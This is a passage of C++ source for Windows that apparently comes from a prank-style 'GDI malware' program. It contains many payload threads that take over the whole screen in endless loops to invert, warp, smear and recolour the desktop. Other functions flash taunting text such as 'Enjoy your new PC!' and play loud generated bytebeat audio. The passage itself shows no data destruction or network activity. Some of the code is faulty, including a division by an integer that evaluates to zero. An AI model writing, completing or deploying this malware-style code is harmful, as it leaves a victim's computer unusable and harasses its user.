            RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI payload3(LPVOID lpParam) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int power = 100;
    while (1) {
        for (int angle = 0; angle < 361; angle += pi / 2) {
            HDC hdc = GetDC(0);
            int x = power * cos(angle * pi / 180.0);
            int y = power * sin(angle * pi / 180.0);
            HBRUSH brush = CreateSolidBrush(Hue(230));
            SelectObject(hdc, brush);
            StretchBlt(hdc, x / 2, y / 20, sw - x / 10, sh - y, hdc, 0, 0, sw, sh, SRCINVERT);
            StretchBlt(hdc, x / 2, y / 20, sw - x / 10, sh - y, hdc, 0, 0, sw, sh, NOTSRCCOPY);
            BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, PATINVERT);
            DeleteObject(brush);
            ReleaseDC(0, hdc);
        }
    }
}

DWORD WINAPI payload4_1(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    DOUBLE angle = 0.f;

    while (1)
    {
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCINVERT);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                double fractalX = (2.5f / w);
                double fractalY = (1.90f / h);

                double cx = x * fractalX - 2.f;
                double cy = y * fractalY - 0.95f;

                int ax = cos(angle) * cx - sin(angle) * cy;
                int ay = sin(angle) * cx + cos(angle) * cy;

                double zx = 0;
                double zy = 0;

                int fx = 0;

                while (((zx * zx) + (zy * zy) + (ay * ay) + (ax * ax)) < 10 && fx < 50)
                {
                    double fczx = zx * zx - zy * zy + cx;
                    double fczy = 2 * zx * zy + cy;

                    zx = fczx;
                    zy = fczy;
                    fx++;

                    rgbquad[index].rgbRed += fx;
                    rgbquad[index].rgbGreen += fx;
                    rgbquad[index].rgbBlue += fx;
                }
            }
        }

        i++;
        angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
    }

    return 0x00;
}

DWORD WINAPI payload4_2(LPVOID lpParam) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int power = 1000;
    while (1) {
        for (int angle = 0; angle < 361; angle += pi / 2) {
            HDC hdc = GetDC(0);
            int x = power * cos(angle * pi / 180.0);
            int y = power * sin(angle * pi / 180.0);
            BitBlt(hdc, x / 20, y / 21, sw, sh, hdc, x / 21, y / 20, SRCCOPY);
            ReleaseDC(0, hdc);
        }
    }
}

DWORD WINAPI payload5_1(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    int power = 1000;

    while (1) {

        for (int angle = 0; angle < 361; angle += pi / 2) {

            HDC hdc = GetDC(0);
            HDC hdcCopy = CreateCompatibleDC(hdc);
            HBITMAP bitmap = CreateCompatibleBitmap(hdc, w, h);

            SelectObject(hdcCopy, bitmap);

            int x = power * cos(angle * pi / 18.0);
            int y = power * sin(angle * pi / 18.0);

            StretchBlt(hdcCopy, x / 2, -y / 2, w - x / 10, h - y, hdc, 0, 0, w, h, SRCCOPY);
            BLENDFUNCTION blend = { 0,0,10,0 };
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);

            ReleaseDC(0, hdc);
            DeleteDC(hdcCopy);
            DeleteObject(bitmap);
        }
    }
}

DWORD WINAPI payload5_2(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = rand() % 300 + 20, y = rand() % 300 + 20;
        int sx = rand() % (w - x), sy = rand() % (h - y);
        int dx = rand() % (w - x), dy = rand() % (h - y);
        BitBlt(hdc, dx, dy, x, y, hdc, sx, sy, SRCPAINT);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI payload6(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI hsl1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int cx = (x - (screenWidth / 2));
                int cy = (y - (screenHeight / 2));

                int zx = cos(angle) * cx - atanl(angle) * cy;
                int zy = atanl(angle) * cx + cos(angle) * cy;

                int fx = (zx + i) ^ (zy + i);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        angle += 0.1f;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

}

DWORD WINAPI SphereThread(LPVOID lpParam) {
    srand((unsigned)time(NULL));
    GenerateSphere();

    icons[0] = LoadIcon(NULL, IDI_APPLICATION);
    icons[1] = LoadIcon(NULL, IDI_WARNING);
    icons[2] = LoadIcon(NULL, IDI_ERROR);
    icons[3] = LoadIcon(NULL, IDI_QUESTION);
    icons[4] = LoadIcon(NULL, IDI_INFORMATION);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    centerX = screenW / 2;
    centerY = screenH / 2;

    HDC hdc = GetDC(NULL);

    while (true) {
        centerX += vx;
        centerY += vy;

        if (centerX - 150 < 0 || centerX + 150 > screenW) vx = -vx;
        if (centerY - 150 < 0 || centerY + 150 > screenH) vy = -vy;

        angleX += 0.02f;
        angleY += 0.015f;

        DrawScene(hdc);
    }

    ReleaseDC(NULL, hdc);
    return 0;
}

DWORD WINAPI payload7(LPVOID lpParam) {
    float time = 0.0f;

    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (true) {

        HDC hdc = GetDC(NULL);
        HDC hdcCopy = CreateCompatibleDC(hdc);
        HBITMAP bitmap = CreateCompatibleBitmap(hdc, w, h);

        SelectObject(hdcCopy, bitmap);

        ShiftColors(hdcCopy, bitmap, w, h);
        SetGraphicsMode(hdc, GM_ADVANCED);

        ApplyDistortion(hdc, w, h, time);

        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        time += 0.1f;

        DeleteObject(bitmap);
        DeleteDC(hdcCopy);
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI payload8(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    RECT rect;
    POINT lpt[3];

    while (1)
    {
        hdc = GetDC(0);
        INT counter = (rand() % 30) - (rand() % 30);
        GetWindowRect(GetDesktopWindow(), &rect);

        if (rand() % 2 == 0)
        {
            lpt[0].x = rect.left + counter;
            lpt[0].y = rect.top - counter;
            lpt[1].x = rect.right + counter;
            lpt[1].y = rect.top - counter;
            lpt[2].x = rect.left - counter;
            lpt[2].y = rect.bottom - counter;
            PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        }

        else if (rand() % -2 == 1)
        {
            lpt[0].x = rect.left - counter;
            lpt[0].y = rect.top + counter;
            lpt[1].x = rect.right - counter;
            lpt[1].y = rect.top - counter;
            lpt[2].x = rect.left - counter;
            lpt[2].y = rect.bottom + counter;
            PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        }

        PlgBlt(hdcCopy, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        BLENDFUNCTION blend = { 0, 0, 100, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI rgbquad(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int cx = (x - (screenWidth / 2));
                int cy = (y - (screenHeight / 2));

                int fx = sqrt(x * y) * 10;
                int fx1 = (sqrt(x * y) * 10) / (99 / 100);
                int fx2 = (sqrt(x * y) * 10) / (98 / 100);

                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx1;
                rgbquad[index].rgbBlue += fx2;
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

}

DWORD WINAPI payload9(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hdcCopy, bmp);

    BLENDFUNCTION blur = { 0 };

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1)
    {
        BitBlt(hdcCopy, 10, 10, w, h, hdc, 10, 10, SRCPAINT);
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
    }

    return 0x00;
}

DWORD WINAPI hsl2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int cx = (x - (screenWidth / 2));
                int cy = (y - (screenHeight / 2));

                int fx = cbrt(x);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

}

DWORD WINAPI textouts(LPVOID lpParam) {
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    LPCSTR text4 = 0;
    LPCSTR text5 = 0;
    LPCSTR text6 = 0;
    LPCSTR text7 = 0;
    LPCSTR text8 = 0;
    LPCSTR text9 = 0;
    LPCSTR text10 = 0;
    LPCSTR text11 = 0;

    while (1)
    {
        HDC hdc = GetDC(0);
        text1 = "Tetraphenylbenzane.exe";
        text2 = "UltraDasher965";
        text3 = "Think about your life decisions.";
        text4 = "Enjoy your new PC!";
        text5 = "''oh my xoltus'' - ChrisRM380";
        text6 = "JERN is the best at AI coding";

        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, Hue(239));

        HFONT font1 = CreateFontA(30, 36, rand() % 45, rand() % 45, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Verdana");
        SelectObject(hdc, font1);

        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
        TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
        TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));

        DeleteObject(font1);
        ReleaseDC(0, hdc);
        Sleep(20);
    }
}

DWORD WINAPI payload10(LPVOID lpParam) { //Credits to my brother TELEPATHII for this effect!
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCINVERT);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = (x - (w / 2));
                int cy = (y - (h / 2));

                int zx = cos(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;

                int fx = (i * (zx - cbrt(zy))) / 100;

                rgbquad[index].rgbRed ^= fx;
                rgbquad[index].rgbGreen ^= fx + 2;
                rgbquad[index].rgbBlue ^= fx + 4;
            }
        }

        i++;
        angle += 0.1f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        BitBlt(hdc, 2, 0, w, h, hdc, 0, 0, SRCPAINT);
        BitBlt(hdc, -2, 0, w, h, hdc, 0, 0, SRCPAINT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI payload11(LPVOID lpParam) {
        HDC hdc = GetDC(NULL);
        HDC hdcCopy = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);

        int ws = w;
        int hs = h;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);

        SetStretchBltMode(hdc, COLORONCOLOR);
        SetStretchBltMode(hdcCopy, COLORONCOLOR);

        int color = 0;

        bool statementA = true;
        bool statementB = true;

        while (1)
        {
            StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCINVERT);

            int r = rand() % 0xFF;
            int g = rand() % 0xFF;
            int b = rand() % 0xFF;

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    int noise = rand() % 0xFF;

                    noise %= (r >> g >> b + 1) * (color) + 1;

                    rgbquad[index].rgbRed += noise + r;
                    rgbquad[index].rgbGreen += noise + g;
                    rgbquad[index].rgbBlue += noise + b;
                }
            }

            if (statementA)
            {
                color++;

                if (color > 0xAA)
                {
                    statementA = false;
                    statementB = true;
                }
            }

            if (statementB)
            {
                color--;

                if (color == 0)
                {
                    statementA = true;
                    statementB = false;
                }
            }

            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCINVERT);
            RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        }

        return 0x00;
}

DWORD WINAPI payload12(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCINVERT);
        BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, SRCPAINT);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI circles(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (int x = 0; x < w; x++)
    {
        for (int y = 0; y < h; y++)
        {
            LOGBRUSH logBrush = { BS_SOLID, RGB(rand() % 0xFF, rand() % 0xFF, rand() % 0xFF) };
            HBRUSH hbrush = CreateBrushIndirect(&logBrush);

            SelectObject(hdc, hbrush);

            PatBlt(hdc, 0, 0, w, h, PATINVERT);

            int randx = rand() % w;
            int randy = rand() % h;

            int r = rand() % 300;

            Ellipse(hdc, randx - r, randy - r, randx + r, randy + r);

            DeleteObject(hbrush);

            RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        }
    }

    return 0x00;
}

DWORD WINAPI payload13(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI circles2(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += rand() % 300)
        {
            invertcircle(x - i / 2, y - i / 2, i, i);
            RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        }
    }
}

DWORD WINAPI payload14(LPVOID lpParam) {
    int time = GetTickCount();

    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    for (int i = 0;; i++, i %= 3) {

        HDC hdc = GetDC(NULL);
        HDC hdcCopy = CreateCompatibleDC(hdc);
        HBITMAP bitmap = CreateBitmap(w, h, 1, 32, data);

        SelectObject(hdcCopy, bitmap);

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCINVERT);

        GetBitmapBits(bitmap, w * h * 4, data);

        int v = 0;
        BYTE byte = 0;

        if ((GetTickCount() - time) > 60000)
            byte = randy() % 0xff;

        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && randy() % 100 == 0)
                v = randy() % 5;
            ((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + i + v))[v] ^ byte;
        }

        SetBitmapBits(bitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCPAINT);

        DeleteObject(bitmap);
        DeleteObject(hdcCopy);
        DeleteObject(hdc);
    }
    return 0;
}

DWORD WINAPI pidh(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HDC hdcCopy = CreateCompatibleDC(hdc);

    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };

    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;

    HBITMAP bitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);

    SelectObject(hdcCopy, bitmap);

    for (;;) {

        hdc = GetDC(0);
        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += (x ^ y) * (i / 10000);
        }

        BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCPAINT);

        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI payload15(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (1) {
        HDC hdc = GetDC(0);

        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);

        StretchBlt(hdc, rand() % - 10 + 10, rand() % -10 + 10, w + rand() % 20 - 20, h + rand() % 20 - 20, hdc, 0, 0, w, h, 0x1900ac010e);

        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI bytebeat1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> (1 + (40000000 / (1 + (t >> 9))))) * t) + (t >> 1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(sin(100 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11))) * ((t >> 1) & 130));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 2) * (t & (t & 32768 ? 16 : 24) | t >> (t >> 8 & 24)) | t >> 3) + 1;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t) * ((t >> 11 | t % 15 * t >> 9) & 8 * t >> 10 & 97);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(17 * t) | (t >> 3) + (1 - (t >> 13 & 1)) * t | (t & t >> 4) | (t & t >> 5);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
